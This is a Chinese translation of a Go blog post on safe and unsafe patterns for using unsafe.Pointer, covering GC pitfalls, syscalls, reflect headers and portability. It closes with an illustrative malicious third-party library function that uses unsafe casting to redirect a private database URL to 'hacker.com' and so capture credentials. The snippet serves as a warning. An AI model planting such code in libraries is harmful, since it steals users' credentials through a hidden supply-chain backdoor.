首发于：https://studygolang.com/articles/35043

# unsafe 真就不安全吗？- part2

在[上篇文章](https://studygolang.com/articles/28433)中，我已经谈到了 unsafe 包的初衷和功能。但还有一件事情没有解释。

## type pointer

此类型表示指向任意类型的指针，这意味着，unsafe.Pointer 可以转换为任何类型或 uintptr 的指针值。你可能会想: 有什么限制吗？没有，是的... 你可以转换 Pointer 为任何你想要的，但你必须处理可能的后果。为了减少可能出现的问题，你可以使用某些模式：

> “*以下涉及 Pointer 的模式是有效的。不使用这些模式的代码今天可能无效，或者将来可能无效。即使是下面这些有效的模式，也带有重要的警告。*” —— golang.org

你也可以使用 go vet，但是它不能解决所有的问题。因此，我建议你遵循这些模式，因为这是减少错误的唯一方法。

## 快速拷贝

如果两种类型的内存布局相同，为了避免内存分配，你可以通过以下机制将类型 `*T1` 的指针转换为类型 `*T2` 的指针，将类型 T1 的值复制到类型 T2 的变量中：

```go
ptrT1 := &T1{}
ptrT2 = (*T2)(unsafe.Pointer(ptrT1))
```

但是要小心，这种转换是有代价的，现在两个指针指向同一个内存地址，所以每个指针的改变也会反应到另一个指针上。可以通过[这里验证](https://play.studygolang.com/p/bZGEHrHp4LM)。

## unsafe.Pointer != uintptr

我已经提到过，指针可以转换为 uintptr 并转回来，但是转回来是有一些特殊的条件限制的。unsafe.Pointer 是一个真正的指针，它不仅保持内存地址，包括动态链接的地址，但 uintptr 只是一个数字，因此它更小，但有代价。如果你转换 unsafe.Pointer 为 uintptr 后，指针不再引用指向的变量，而且在将 uintptr 转换回 unsafe.Pointer 变量之前，垃圾收集器可以轻松地回收该内存。至少有两种解决方案可以避免此问题。第一个更复杂的，但也真正显示了，为了使用 unsafe 包，你必须牺牲什么。有一个特殊的函数，runtime.KeepAlive 可以避免 GC 不恰当的回收。它听起来很复杂，而且使用起来更加复杂。这里为你准备了[实际例子](https://play.studygolang.com/p/L7rgheqNo9w)。

## 指针算法

还有另一种方法避免 GC 不恰当回收。即在同一个语句中做以下事情：将 unsafe.Poniter 转为 uintptr，以及将 uintptr 做其他运算，最后转回 unsafe.Pointer 。因为 uintptr 只是一个数字，我们可以做所有特殊的算术运算，比如加法或减法。我们如何使用它？指针算法通过了解内存布局和算术运算，可以得到任何需要的数据。让我们来看看下一个例子：

```go
x := [4]byte{10, 11, 12, 13}
elPtr := unsafe.Pointer(uintptr(unsafe.Pointer(&x[0])) + 3*unsafe.Sizeof(x[0]))
```

有了指向字节数组第一个元素的指针，我们就可以在不使用索引的情况下获得最后一个元素。如果将指针移动三个字节，我们就可以得到最后一个元素。让我可视化展示：

![Pointer arithmetic](https://www.dnahurnyi.com/img/Pointer-arithmetic.png)

因此，在一个表达式中执行所有转换可以省去 GC 清理的麻烦。上述三种模式说明了如何在不同情况下正确地转换 unsafe.Pointer 为其他数据类型的指针。

## Syscalls

在包 syscall 中，有一个函数 syscall.Syscall 接收 uintptr 格式的指针的系统调用，我们可以通过 unsafe.Pointer 得到 uintptr。重要的是，你必须进行正确的转换：

```go
a := &A{1}
b := &A{2}
syscall.Syscall(0, uintptr(unsafe.Pointer(a)), uintptr(unsafe.Pointer(b))) // Right

aPtr := uintptr(unsafe.Pointer(a)
bPtr := uintptr(unsafe.Pointer(b)
syscall.Syscall(0, aPtr, bPtr) // Wrong
```

## reflect.Value.Pointer 和 reflect.Value.UnsafeAddr

reflect 包中有两个方法: Pointer 和 UnsafeAddr，它们返回 uintptr，因此我们应该立即将结果转换为 unsafe.Pointer，因为我们需要时刻“提防”我们的 GC 朋友：

```go
p1 := (*int)(unsafe.Pointer(reflect.ValueOf(new(int)).Pointer())) // Right

ptr := reflect.ValueOf(new(int)).Pointer() // Wrong
p2 := (*int)(unsafe.Pointer(ptr) // Wrong
```

## reflect.SliceHeader 和 reflect.StringHeader

reflect 包中有两种类型: SliceHeader 和 StringHeader，它们都具有字段 Data uintptr。正如你所记得的那样，uintptr 通常与 unsafe.Pointer 联系在一起，见下面代码：

```go
var s string
hdr := (*reflect.StringHeader)(unsafe.Pointer(&s))
hdr.Data = uintptr(unsafe.Pointer(p))
hdr.Len = n
```

---

以上就是所有可能关于 unsafe.Pointer 使用的模式，所有不遵循这些模式或从这些模式派生的情况很可能是无效的。但是 unsafe 包不仅在代码中而且在代码之外都会带来问题。让我们回顾一下其中的几个。

## 兼容性

Go 有[兼容性指南](https://docs.studygolang.com/doc/go1compat)，保证版本更新的兼容性。简单地说，它保证你的代码在升级后仍然可以工作，但是不能保证你已经导入了 unsafe 的包。unsafe 包的使用可能会破坏你的代码的每个版本: major，minor，甚至安全修补程序。所以在导入之前，试着想一下这样一种情况：你的客户问你为什么我们不能通过升级 Go 版本来消除漏洞，或者为什么在更新之后什么都不能工作了。

## 不同的行为

你知道所有的 Go 数据类型吗？你听说过 int 吗？如果我们已经有 int32 和 int64，为什么还有 int？实际上 int 类型是根据计算机体系结构（x32 或 x64）将其转换为 int32 或 int64 类型。所以请记住，unsafe 的函数结果和内存布局在不同的架构上可能是不同的，例如：

```go
var s string
unsafe.Sizeof(s) // x32 上是 8，而 x64 上是 16
```

## 社区的情况

我想知道：如果这个包如此危险，有多少冒险者在使用它。我已经在 [GitHub](https://github.com/search?l=Go&q=unsafe&type=Repositories) 上搜索过了。与 [crypto](https://github.com/search?l=Go&q=crypto&type=Repositories) 或 [math](https://github.com/search?l=Go&q=math&type=Repositories) 相比，数量并不多。其中超过一半的内容是关于使用 unsafe 的方法的技巧和可能的偏差，而不是一些真正的用法。

Rust 社区有一个事件：一个叫 Nikolay Kim 的，他是 [activex](https://github.com/actix) 项目的创始人，在社区的巨大压力下，将 activex 库变成了私有。后来再公开该仓库时，将其中一个贡献者提升为所有者，然后[离开](https://github.com/actix/actix-web/issues/1289)。所有这一切的发生都是因为一些人认为使用了 unsafe 包，这太危险不应该使用。我知道 Go 社区目前没有这种情况，而且 Go 社区里也没有唯一正确的观点。我想要提醒的是，如果你在代码中导入了 unsafe 的代码，请做好准备，社区可能会。。。

## 爱好者

有很多人和很多想法，[这篇文章](https://nullprogram.com/blog/2019/06/30/)展示了使用 int 和使用指针操作的新方法，简而言之，它看起来像这样：

```go
var foo int
fooslice = (*[1]int)(unsafe.Pointer(&foo))[:]
```

对此，我不发表意见，我只会提到，你应该注意导入 unsafe 可能的问题。

## 最后

我个人试着去思考 unsafe 带来问题的可能性，这里有一个使用 unsafe 的例子。假设你导入了一些执行某些有用操作的第三方包，比如将 DB 客户端对象和日志记录器包装到一个实体中，以使所有操作的日志记录更加容易，或者像我的例子中那样，导入一些返回对象的动物的函数...

```go
package main

import (
	"fmt"
	"third-party/safelib"
)

func main() {
	a := safelib.NewA("https://google.com", "1234") // Url and password
	fmt.Println("My spiritual animal is: ", safelib.DoSomeHipsterMagic(a))
	a.Show()
}
```

在这个函数中，我们将 interface{} 断言为一些已知类型，并快速复制到一些 `Malicious` 类型，这些 `Malicious` 类型具有获取和设置私有字段的方法，如 url 和密码。所以这个包可以提取出所有有趣的数据，甚至替换 url，这样下次你尝试连接到 DB 时，有人会获得你的凭证。

```go
func DoSomeHipsterMagic(any interface{}) string {
	if a, ok := any.(*A); ok {
		mal := (*Malicious)(unsafe.Pointer(a))
		mal.setURL("http://hacker.com")
	}

	return "Cool green dragon, arrh 🐉"
}
```

最后的最后，切记所有的技术都有一定的代价，但是 unsafe 技术尤其“昂贵”，所以我的建议是在使用它之前要三思。

---

via: https://www.dnahurnyi.com/is-unsafe-...unsafe-pt.-2/

作者：[Denys Nahurnyi](https://www.dnahurnyi.com/)
译者：[polaris1119](https://github.com/polaris1119)
校对：[unknwon](https://github.com/unknwon)

本文由 [GCTT](https://github.com/studygolang/GCTT) 原创编译，[Go 中文网](https://studygolang.com/) 荣誉推出